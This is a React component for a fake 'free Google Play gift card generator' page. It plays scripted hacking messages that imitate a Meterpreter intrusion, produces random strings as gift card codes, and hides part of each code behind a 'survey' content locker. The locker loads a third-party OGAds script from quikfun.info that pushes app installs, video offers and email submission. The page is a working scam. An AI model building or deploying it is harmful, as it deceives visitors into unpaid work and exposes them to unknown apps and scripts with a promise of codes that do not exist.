import React, { useState, useEffect } from 'react';
import { Gift, Menu, X, ChevronDown, Check, Loader } from 'lucide-react';

export default function GiftCardGenerator() {
  const [menuOpen, setMenuOpen] = useState(false);
  const [showReadMore, setShowReadMore] = useState(false);
  const [selectedCard, setSelectedCard] = useState(null);
  const [generatorStep, setGeneratorStep] = useState(0);
  const [generatedCode, setGeneratedCode] = useState('');
  const [hackText, setHackText] = useState([]);
  const [isLoading, setIsLoading] = useState(true);
  const [showLocker, setShowLocker] = useState(false);

  const cards = ['$10', '$25', '$50'];
  
  const platforms = [
    { name: 'Google Play', active: true, color: 'bg-green-500' },
    { name: 'Xbox', active: false, color: 'bg-green-600' },
    { name: 'Steam', active: false, color: 'bg-blue-900' },
    { name: 'Playstation', active: false, color: 'bg-blue-600' },
    { name: 'Spotify', active: false, color: 'bg-green-500' },
    { name: 'iTunes', active: false, color: 'bg-purple-500' },
    { name: 'PayPal', active: false, color: 'bg-blue-500' },
    { name: 'Amazon', active: false, color: 'bg-orange-500' }
  ];

  const hackMessages = [
    'Connecting to Google Play server...',
    'Server is up at 192.200.175.162:445 (latency 0.013s)',
    'Connecting to server SQL database...',
    'Obtaining a service manager handle...',
    'Creating a new service through pipeline...',
    'Closing service handle...',
    'Sending stage (749370 bytes) to 192.200.175.162',
    'Meterpreter session 1 opened at port 445',
    'Connected to Google Play server...',
    'Searching database for unused codes...',
    'Success!'
  ];

  useEffect(() => {
    // Simulate page load
    setTimeout(() => setIsLoading(false), 1500);
  }, []);

  useEffect(() => {
    // Load OGAds script when locker is shown
    if (showLocker) {
      const script = document.createElement('script');
      script.type = 'text/javascript';
      script.id = 'ogjs';
      script.src = 'https://quikfun.info/cl/js/4o245r';
      script.async = true;
      
      const container = document.getElementById('content-locker-container');
      if (container) {
        container.appendChild(script);
      }
      
      return () => {
        // Cleanup: remove script when component unmounts
        const existingScript = document.getElementById('ogjs');
        if (existingScript) {
          existingScript.remove();
        }
      };
    }
  }, [showLocker]);

  const generateCode = () => {
    const segments = [5, 6, 6, 5];
    return segments.map(len => 
      Array.from({length: len}, () => 
        'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 36)]
      ).join('')
    ).join('-');
  };

  const startGeneration = (value) => {
    setSelectedCard(value);
    setGeneratorStep(1);
    setHackText([]);
    
    let msgIndex = 0;
    const interval = setInterval(() => {
      if (msgIndex < 9) {
        setHackText(prev => [...prev, hackMessages[msgIndex]]);
        msgIndex++;
      } else {
        clearInterval(interval);
        setTimeout(() => {
          setGeneratorStep(2);
          setHackText(prev => [...prev, hackMessages[9]]);
          setTimeout(() => {
            setGeneratorStep(3);
            setGeneratedCode(generateCode());
            setHackText(prev => [...prev, hackMessages[10]]);
          }, 2000);
        }, 2000);
      }
    }, 300);
  };

  if (isLoading) {
    return (
      <div className="fixed inset-0 bg-gradient-to-br from-green-900 via-green-700 to-green-900 flex items-center justify-center">
        <div className="text-center">
          <div className="w-20 h-20 mx-auto mb-4 relative">
            <Gift className="w-20 h-20 text-white animate-pulse" />
          </div>
          <div className="flex space-x-2 justify-center">
            <div className="w-3 h-3 bg-white rounded-full animate-bounce" style={{animationDelay: '0s'}}></div>
            <div className="w-3 h-3 bg-white rounded-full animate-bounce" style={{animationDelay: '0.2s'}}></div>
            <div className="w-3 h-3 bg-white rounded-full animate-bounce" style={{animationDelay: '0.4s'}}></div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
      {/* Navigation */}
      <nav className="fixed top-0 left-0 right-0 bg-black bg-opacity-90 backdrop-blur-md z-50 border-b border-gray-800">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center space-x-2">
              <Gift className="w-8 h-8 text-green-500" />
              <span className="text-xl font-bold bg-gradient-to-r from-green-400 to-emerald-600 bg-clip-text text-transparent">
                Gift Cards King
              </span>
            </div>
            
            <button 
              onClick={() => setMenuOpen(!menuOpen)}
              className="lg:hidden p-2 hover:bg-gray-800 rounded-lg transition"
            >
              {menuOpen ? <X className="w-6 h-6" /> : <Menu className="w-6 h-6" />}
            </button>

            <div className="hidden lg:flex space-x-1">
              {platforms.map((platform, idx) => (
                <a
                  key={idx}
                  href="#"
                  className={`px-4 py-2 rounded-lg font-medium transition-all duration-300 ${
                    platform.active 
                      ? 'bg-green-600 text-white shadow-lg shadow-green-500/50' 
                      : 'text-gray-400 hover:text-white hover:bg-gray-800'
                  }`}
                >
                  {platform.name}
                </a>
              ))}
            </div>
          </div>
        </div>

        {/* Mobile Menu */}
        {menuOpen && (
          <div className="lg:hidden bg-gray-900 border-t border-gray-800">
            {platforms.map((platform, idx) => (
              <a
                key={idx}
                href="#"
                className={`block px-6 py-3 border-b border-gray-800 transition ${
                  platform.active 
                    ? 'bg-green-600 text-white' 
                    : 'text-gray-400 hover:bg-gray-800'
                }`}
              >
                {platform.name}
              </a>
            ))}
          </div>
        )}
      </nav>

      {/* Hero Section */}
      <div className="pt-24 pb-12 px-4">
        <div className="max-w-6xl mx-auto">
          {/* Animated Gift Cards */}
          <div className="flex justify-center items-center mb-12 relative h-64">
            {cards.map((value, idx) => (
              <div
                key={idx}
                className={`absolute transition-all duration-1000 ${
                  idx === 0 ? 'left-1/4 -translate-x-1/2 scale-90 opacity-70 rotate-6' :
                  idx === 1 ? 'left-1/2 -translate-x-1/2 scale-110 z-10' :
                  'left-3/4 -translate-x-1/2 scale-90 opacity-70 -rotate-6'
                }`}
              >
                <div className="w-48 h-64 bg-gradient-to-br from-green-500 via-green-600 to-emerald-700 rounded-2xl shadow-2xl shadow-green-500/50 p-6 flex flex-col justify-between border-4 border-green-400 border-opacity-30">
                  <div className="text-center">
                    <Gift className="w-12 h-12 mx-auto mb-2 text-white" />
                    <div className="text-xs font-semibold text-green-100">GOOGLE PLAY</div>
                  </div>
                  <div className="text-center">
                    <div className="text-5xl font-extrabold text-white mb-2">{value}</div>
                    <div className="text-xs text-green-200">GIFT CARD</div>
                  </div>
                </div>
              </div>
            ))}
          </div>

          {/* Title */}
          <div className="text-center mb-8">
            <h1 className="text-5xl md:text-6xl lg:text-7xl font-extrabold mb-6 leading-tight">
              Do you want some
              <br />
              <span className="bg-gradient-to-r from-green-400 via-emerald-500 to-green-600 bg-clip-text text-transparent">
                Free Google Play
              </span>
              <br />
              Gift Cards
            </h1>
            <div className="animate-bounce mt-8">
              <ChevronDown className="w-12 h-12 mx-auto text-gray-500" />
            </div>
          </div>
        </div>
      </div>

      {/* About Section */}
      <div className="py-16 px-4 bg-gradient-to-b from-transparent to-green-900/20">
        <div className="max-w-4xl mx-auto">
          <div className="bg-gray-900 bg-opacity-80 backdrop-blur-lg rounded-3xl p-8 shadow-2xl border border-gray-800">
            <div className="flex items-center justify-center mb-6">
              <div className="w-24 h-24 bg-gradient-to-br from-green-500 to-emerald-600 rounded-2xl flex items-center justify-center shadow-lg">
                <Gift className="w-12 h-12 text-white" />
              </div>
            </div>
            
            <p className="text-xl text-gray-300 text-center mb-6">
              Get free Google Play Gift Card code and redeem for anything in the Google Play Store.
            </p>

            {showReadMore && (
              <div className="mt-6 space-y-6 text-gray-400 animate-fadeIn">
                <div>
                  <h2 className="text-2xl font-bold text-white mb-3">How to get free Google Play Gift Cards</h2>
                  <p>Free Google Play Gift Card codes are very easy to get with our Generator. The only thing you have to do is to choose your Gift Card value and wait for the generator to find unused Gift Card on Google Play server. Get unused codes safely and directly from your web browser.</p>
                </div>

                <div>
                  <h2 className="text-2xl font-bold text-white mb-3">How to redeem Google Play Gift Card</h2>
                  <p>Redeem your Gift Card with your mobile, tablet or desktop. Go to the Google Play Store, click at the menu bar and choose Redeem Code. Now you only have to fill in your generated code and that is all, the money will be available on your account.</p>
                </div>

                <div>
                  <h2 className="text-2xl font-bold text-white mb-3">How is this possible</h2>
                  <p>We do not generate new codes and push them to the Google Play database like other groups, because this can lead to ban of your account. Instead we generate random Gift Card codes and search their database if they exist and can be used.</p>
                </div>
              </div>
            )}

            <button
              onClick={() => setShowReadMore(!showReadMore)}
              className="mt-6 mx-auto block text-green-400 hover:text-green-300 font-semibold transition"
            >
              {showReadMore ? 'Read Less' : 'Read More'}
            </button>
          </div>
        </div>
      </div>

      {/* Choose Card Section */}
      <div className="py-16 px-4">
        <div className="max-w-5xl mx-auto">
          <h2 className="text-4xl md:text-5xl font-bold text-center mb-12">
            Choose Gift<br />Card value
          </h2>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            {cards.map((value, idx) => (
              <button
                key={idx}
                onClick={() => startGeneration(value)}
                className="group relative"
              >
                <div className="w-full aspect-[3/4] bg-gradient-to-br from-green-500 via-green-600 to-emerald-700 rounded-2xl shadow-xl hover:shadow-2xl hover:shadow-green-500/50 p-6 flex flex-col justify-between border-4 border-green-400 border-opacity-30 transform transition-all duration-300 hover:scale-105 hover:-translate-y-2">
                  <div className="text-center">
                    <Gift className="w-16 h-16 mx-auto mb-3 text-white" />
                    <div className="text-sm font-semibold text-green-100">GOOGLE PLAY</div>
                  </div>
                  <div className="text-center">
                    <div className="text-6xl font-extrabold text-white mb-3">{value}</div>
                    <div className="text-sm text-green-200 mb-4">GIFT CARD</div>
                    <div className="bg-white text-green-600 font-bold py-3 px-6 rounded-full group-hover:bg-green-100 transition">
                      GENERATE
                    </div>
                  </div>
                </div>
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Generator Modal */}
      {generatorStep > 0 && (
        <div className="fixed inset-0 bg-black bg-opacity-90 backdrop-blur-sm z-50 flex items-center justify-center p-4 animate-fadeIn">
          <div className="bg-gradient-to-br from-gray-900 to-black border-2 border-green-500 rounded-3xl max-w-2xl w-full p-8 shadow-2xl shadow-green-500/50">
            {/* Steps Progress */}
            <div className="mb-8">
              <div className="flex justify-between items-center mb-4">
                {['Connecting', 'Generating', 'Completed'].map((step, idx) => (
                  <div key={idx} className="flex-1 text-center">
                    <div className={`text-sm font-semibold mb-2 ${generatorStep > idx ? 'text-green-400' : 'text-gray-600'}`}>
                      {step}
                    </div>
                  </div>
                ))}
              </div>
              
              <div className="relative h-2 bg-gray-800 rounded-full overflow-hidden">
                <div 
                  className="absolute h-full bg-gradient-to-r from-green-500 to-emerald-600 transition-all duration-1000"
                  style={{ width: `${(generatorStep / 3) * 100}%` }}
                ></div>
              </div>

              <div className="flex justify-between mt-2">
                {[1, 2, 3].map((num) => (
                  <div key={num} className={`w-8 h-8 rounded-full flex items-center justify-center font-bold ${
                    generatorStep >= num ? 'bg-green-500 text-white' : 'bg-gray-800 text-gray-600'
                  }`}>
                    {generatorStep > num ? <Check className="w-5 h-5" /> : num}
                  </div>
                ))}
              </div>
            </div>

            {/* Logo */}
            <div className="flex items-center justify-center mb-6">
              <div className="w-20 h-20 bg-gradient-to-br from-green-500 to-emerald-600 rounded-2xl flex items-center justify-center shadow-lg">
                <Gift className="w-10 h-10 text-white" />
              </div>
            </div>

            {/* Generated Code Display */}
            {generatedCode && (
              <div className="bg-gray-900 border-2 border-green-500 rounded-xl p-6 mb-6 text-center">
                <div className="text-2xl font-mono font-bold text-green-400 tracking-wider">
                  {generatedCode.slice(0, -4)}
                  <span className="text-gray-600">XXXX</span>
                </div>
                <div className="text-sm text-gray-400 mt-2">Your {selectedCard} Gift Card Code</div>
                <div className="text-xs text-yellow-400 mt-2">üîí Last 4 characters hidden - Complete survey to unlock</div>
              </div>
            )}

            {/* Hack Terminal */}
            <div className="bg-black rounded-xl p-4 mb-6 h-64 overflow-y-auto border border-green-900">
              {hackText.map((text, idx) => (
                <div key={idx} className="text-green-400 font-mono text-xs mb-1 animate-fadeIn">
                  <span className="text-green-600">{'>'}</span> {text}
                  {idx === hackText.length - 1 && generatorStep < 3 && (
                    <span className="inline-block w-2 h-4 bg-green-400 ml-1 animate-pulse"></span>
                  )}
                </div>
              ))}
              {generatorStep === 2 && (
                <div className="text-green-400 font-mono text-xs flex items-center">
                  <Loader className="w-4 h-4 mr-2 animate-spin" />
                  Searching...
                </div>
              )}
            </div>

            {/* Action Button */}
            {generatorStep === 3 && !showLocker && (
              <div className="text-center">
                <div className="bg-yellow-600 text-yellow-100 rounded-xl p-4 mb-6">
                  <p className="font-semibold">Please complete one survey to unlock your code!</p>
                </div>
                <button 
                  onClick={() => setShowLocker(true)}
                  className="w-full bg-gradient-to-r from-green-500 to-emerald-600 text-white font-bold py-4 px-8 rounded-xl hover:shadow-xl transition-all duration-300 transform hover:scale-105"
                >
                  Complete Survey & Get Code
                </button>
                <button 
                  onClick={() => setGeneratorStep(0)}
                  className="mt-4 text-gray-500 hover:text-white transition"
                >
                  Close
                </button>
              </div>
            )}

            {/* Content Locker */}
            {showLocker && (
              <div className="animate-fadeIn">
                <div className="bg-gradient-to-br from-yellow-600 to-orange-600 rounded-2xl p-6 mb-6">
                  <div className="text-center mb-6">
                    <div className="w-16 h-16 bg-white bg-opacity-20 rounded-full flex items-center justify-center mx-auto mb-4">
                      <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                      </svg>
                    </div>
                    <h3 className="text-2xl font-bold text-white mb-2">üîí Content Locked</h3>
                    <p className="text-yellow-100">Complete one offer below to unlock your {selectedCard} gift card code</p>
                  </div>

                  {/* Offer Cards */}
                  <div className="grid md:grid-cols-2 gap-4 mb-6">
                    {[
                      {
                        title: 'Quick Survey',
                        desc: '2-3 minutes',
                        icon: 'üìã',
                        reward: 'Instant unlock'
                      },
                      {
                        title: 'App Download',
                        desc: 'Install & open app',
                        icon: 'üì±',
                        reward: 'Get code now'
                      },
                      {
                        title: 'Video Offers',
                        desc: 'Watch 30 seconds',
                        icon: 'üé¨',
                        reward: 'Quick & easy'
                      },
                      {
                        title: 'Email Submit',
                        desc: 'Enter your email',
                        icon: '‚úâÔ∏è',
                        reward: 'Fast unlock'
                      }
                    ].map((offer, idx) => (
                      <div key={idx} className="bg-white bg-opacity-10 backdrop-blur-sm rounded-xl p-4 hover:bg-opacity-20 transition cursor-pointer border-2 border-transparent hover:border-white">
                        <div className="flex items-start space-x-3">
                          <div className="text-3xl">{offer.icon}</div>
                          <div className="flex-1">
                            <h4 className="font-bold text-white mb-1">{offer.title}</h4>
                            <p className="text-yellow-100 text-sm mb-2">{offer.desc}</p>
                            <div className="flex items-center text-xs text-yellow-200">
                              <Check className="w-4 h-4 mr-1" />
                              {offer.reward}
                            </div>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>

                  {/* OGAds Content Locker */}
                  <div className="bg-black bg-opacity-30 rounded-xl p-6 mb-4">
                    <div className="text-center text-white mb-4">
                      <p className="text-sm mb-2">üéÅ Complete any offer to unlock</p>
                      <div className="text-xs text-yellow-200">Your code will appear automatically</div>
                    </div>
                    
                    {/* Content Locker Container */}
                    <div 
                      id="content-locker-container" 
                      className="min-h-[500px] bg-white rounded-lg p-6"
                      style={{ width: '100%' }}
                    >
                      <div className="text-center py-8">
                        <Loader className="w-8 h-8 animate-spin mx-auto text-gray-400 mb-2" />
                        <p className="text-gray-600 text-sm">Loading offers...</p>
                      </div>
                    </div>
                    
                  </div>

                  <div className="text-center">
                    <div className="bg-white bg-opacity-10 rounded-lg p-3 mb-4">
                      <p className="text-white text-sm">
                        ‚ö° <strong>Why do I need to complete an offer?</strong>
                      </p>
                      <p className="text-yellow-100 text-xs mt-1">
                        This helps us keep the service 100% free for everyone. It only takes 2-3 minutes!
                      </p>
                    </div>
                    
                    <button 
                      onClick={() => setShowLocker(false)}
                      className="text-yellow-200 hover:text-white text-sm transition"
                    >
                      ‚Üê Back
                    </button>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Footer */}
      <footer className="bg-black border-t border-gray-900 py-8 px-4 mt-16">
        <div className="max-w-7xl mx-auto text-center">
          <div className="flex items-center justify-center space-x-2 mb-4">
            <Gift className="w-6 h-6 text-green-500" />
            <span className="text-xl font-bold text-white">Gift Cards King</span>
          </div>
          <p className="text-gray-500 text-sm">&copy; 2024 Gift Cards King. All rights reserved.</p>
        </div>
      </footer>

      <style>{`
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .animate-fadeIn {
          animation: fadeIn 0.5s ease-out;
        }
      `}</style>
    </div>
  );
}
